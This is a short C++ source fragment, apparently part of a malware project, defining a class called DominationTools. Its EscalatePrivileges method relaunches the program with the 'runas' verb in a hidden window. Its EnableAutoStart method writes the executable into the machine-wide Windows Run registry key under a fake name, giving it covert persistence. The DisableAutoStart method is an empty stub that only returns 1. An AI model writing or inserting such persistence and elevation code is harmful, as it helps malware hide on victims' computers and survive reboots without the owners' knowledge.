class DominationTools{
	private:
		HKEY hKey;
		LONG lnRes;
		const char* czStartName = Current.fakename;
		const char* czExePath	= Current.name;

	public:
		int EscalatePrivileges(){
			SHELLEXECUTEINFO ShExecInfo;
			ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
			ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
			ShExecInfo.hwnd = NULL;
			ShExecInfo.lpVerb = "runas";
			ShExecInfo.lpFile = Current.name;
			ShExecInfo.lpParameters = NULL;
			ShExecInfo.lpDirectory = NULL;
			ShExecInfo.nShow = SW_HIDE;
			ShExecInfo.hInstApp = NULL;
			ShExecInfo.hProcess = NULL;

			ShellExecuteEx(&ShExecInfo);
			return 0;
		}

		int EnableAutoStart(){
		        lnRes = RegOpenKeyEx(  HKEY_LOCAL_MACHINE,
		                                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		                                    0 , KEY_WRITE,
		                                    &hKey);
		        if( 0x00 == lnRes )
		        {
		            lnRes = RegSetValueEx(  hKey,
		                                    czStartName,
		                                    0,
		                                    REG_SZ,
		                                    (unsigned char*)czExePath,
		                                    strlen(czExePath) );
		        }

		        RegCloseKey(hKey);
			return 0;
		}
		int DisableAutoStart(){
			return 1;
		}
};

